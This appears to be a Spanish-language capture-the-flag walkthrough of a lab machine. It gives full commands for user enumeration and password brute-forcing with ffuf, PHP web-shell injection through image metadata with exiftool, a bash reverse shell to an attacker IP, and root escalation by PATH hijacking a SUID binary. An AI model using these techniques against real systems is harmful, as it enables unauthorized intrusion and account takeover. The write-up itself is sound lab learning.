# Reconocimiento
En primer lugar, se averigua la IP objetivo:

```bash
netdiscover

...
192.168.1.156   08:00:27:71:50:ce      1      60  PCS Systemtechnik GmbH
...
```

```
192.168.1.156
```

Se hace un escaneo de puertos para identificar servicios y versiones.

```zsh
nmap --top-ports=10000 --open -T5 -A -Pn -n -v 192.168.1.156 -oX nmap_1.xml && xsltproc nmap_1.xml -o nmap_1.html
```

Los resultados reducen la superficie de ataque a un servidor SSH y un servidor web, ambos en el puerto estándar.

```zsh
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)  
| ssh-hostkey:    
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)  
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)  
80/tcp open  http    Apache httpd 2.4.65  
|_http-title: Did not follow redirect to http://mail.innovasolutions.thl/  
|_http-server-header: Apache/2.4.65 (Debian)  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS
```


## Web
Al visitar la web, uno se encuentra con un formulario de login, el cual no tiene aparentemente ninguna vulnerabilidad sencilla de explotar, sin embargo, llama la atención la funcionalidad de recuperación de contraseña, que aparentemente permite hacer solicitudes ilimitadas y nos da la información de si el usuario existe o no, lo que posteriormente podría usarse para realizar un ataque de fuerza bruta. Mientras tanto se deja un fuzzing corriendo

La request hecha al endpoint de recuperación se intercepta mediante BurpSuite y se analiza, se observa que se manera bastante sencilla, el valor del usuario se pasa mediante una pareja `clave=valor` mediante POST, al no haber limite aparente de solicitudes que pueden hacerse a este endpoint, se pueden enumerar usuarios válidos.

```
POST /forgot_password.php HTTP/1.1
Host: mail.innovasolutions.thl
...
Origin: http://mail.innovasolutions.thl
...

username=hola
```

Para realizar este ataque de enumeración de usuarios válidos, se copia la petición interceptada por Burp como comando (clic derecho > Copy as curl command (bash)) y se modifica para hacer un fuzzing con ese valor que se pasa por POST.

```zsh
ffuf -c -r -t 100 -w /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -H $'Host: mail.innovasolutions.thl' -H $'Content  
-Length: 13' -H $'Cache-Control: max-age=0' -H $'Accept-Language: en-US,en;q=0.9' -H $'Origin: http://mail.innovasolutions.thl' -H $'Content-T  
ype: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36  
(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36' -H $'Referer: http://mail.innovasolutions.thl/forgot_password.php' -d $'username=FUZZ' -u  
'http://mail.innovasolutions.thl/forgot_password.php' -fs 1365
```

Todos los headers (`-H`) no son más que cabeceras HTTP sacadas de la petición interceptaba que en muchos casos son imprescindibles (aunque según cuál se quite algunos servidores pueden dar falsos negativos). Tras iterar por los 624370 items del diccionario, el fuzzing encuentra un usuario válido.

```zsh
laptop                  [Status: 200, Size: 1386, Words: 273, Lines: 29, Duration: 0ms]
```

> En este caso, todas las respuestas del servidor son un código 200 (éxito), lo que se hace es añaidr `-fs 1365` para filtrar el tamaño de la respuesta "Cuenta no valida", de esa manera sabemos que esa cuenta es válida, ya que al cambiar la longitud se deduce que el mensaje a cambiado.

Efectivamente, al introducir dicho nombre en la página y darle a enter, los notifica que se ha enviado un correo de recuperación, ahora es momento de intentar un ataque de fuerza bruta a la contraseña.

# Explotación
## Fuerza bruta al login
Con la misma lógica que para el paso anterior y con un comando prácticamente igual, se hace un ataque, esta vez al panel de login

```zsh
ffuf -t 100 -r -c -w /usr/share/wordlists/rockyou.txt \  
   -H $'Host: mail.innovasolutions.thl' -H $'Origin: http://mail.innovasolutions.thl' -H $'Content-Type: application/x-www-form-urlencoded' -  
H $'User-Agent: Mozilla/5.0' -H $'Referer: http://mail.innovasolutions.thl/login.php' -b $'PHPSESSID=ca24nhpm3edrh5f80fjeqecimo' -d 'username=  
laptop&password=FUZZ' -u 'http://mail.innovasolutions.thl/login.php' -fs 1674
```

Ya sabemos las credenciales del usuario.

```
laptop:juliana
```


## Laptop
Ya identificados como el usuario "laptop", se nos redirige a un dashboard donde se pide actualizar el avatar. Al subir una imagen cualquiera, se notifica lo siguiente.

```
¡Imagen subida! Tu nuevo avatar se está procesando. Puedes verlo en /uploads/Kali1.jpg.php
```

Por alguna razón, la página añade la extensión .php al archivo, facilitando bastante el trabajo, tras investigar distintos métodos para abusar subida de archivos, encuentro uno en el cual se inyectan metadatos en la imagen mediante la herramienta exiftool, hago una primera prueba con:

```zsh
exiftool -Comment="<?php phpinfo()?>" avatar.png
```

Y al acceder al archivo, ha funcionado perfecto, se invoca la función tal y como se quería. Ahora, hay que cambiarlo por una revshell, yo decidí utilizar esta: https://github.com/artyuum/simple-php-web-shell/tree/master, el comando queda tal que así (habiendo copiado el código de la shell antes al archivo shell.php, por supuesto)

```zsh
exiftool -Comment="$(cat shell.php)" avatar.png
```

Se sube de nuevo el archivo, se ejecuta al clicarlo y ganamos una shell web. Dentro de esa webshell, ejecuto.

```zsh
bash -c 'bash -i >& /dev/tcp/192.168.1.145/4444 0>&1'
```

> Como disclaimer, estoy 99% seguro de que el paso de la webshell era completamente innecesario, pero me acabo de formatear el ordenador y estaba poniendo mal la IP todo el rato (XD), lo dejo así porque creo que está curioso y funciona bien así


# Escalada
En primer lugar, se sanitiza la shell:
```bash
bash-5.2$ export SHELL=bash  
bash-5.2$ export TERM=xterm-256color  
bash-5.2$ source /etc/skel/.bashrc    
www-data@TheHackersLabs-OperacionPescador:/var/www/html/uploads$
```

Después de buscar vías durante un rato, encuentro un binario que tiene el bit SUID, por lo que se me ocurre probar a hacer un Path Hijacking para escalar privilegios. Incluyo el directorio /tmp al inicio del PATH y creo un archivo con el mismo nombre y le doy permisos de ejecución y el bit SUID, entonces, en su interior pongo sencillamente el contenido: `bash -p`, que lanza una shell heredando los privilegios del dueño de bash (root).

```zsh
www-data@TheHackersLabs-OperacionPescador:/tmp$ find / -perm -u=s -type f 2>/dev/null  
...
/usr/local/bin/get-report  
/usr/bin/chsh  
...
www-data@TheHackersLabs-OperacionPescador:/tmp$ nano get-report ## Y dentro del editor: bash -p > CTRL+X > CTRL + O    
www-data@TheHackersLabs-OperacionPescador:/tmp$ chmod +sx get-report
www-data@TheHackersLabs-OperacionPescador:/tmp$ ./get-report    
bash-5.2# id  
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)  
bash-5.2# whoami  
root  
bash-5.2#
```

Ahora, sanitizo de luego y solo queda extraer las flags.

```zsh
www-data@TheHackersLabs-OperacionPescador:/tmp# cat /home/laptop/flag.txt    
**************************** 
www-data@TheHackersLabs-OperacionPescador:/tmp# cat /root/root.txt    
****************************
```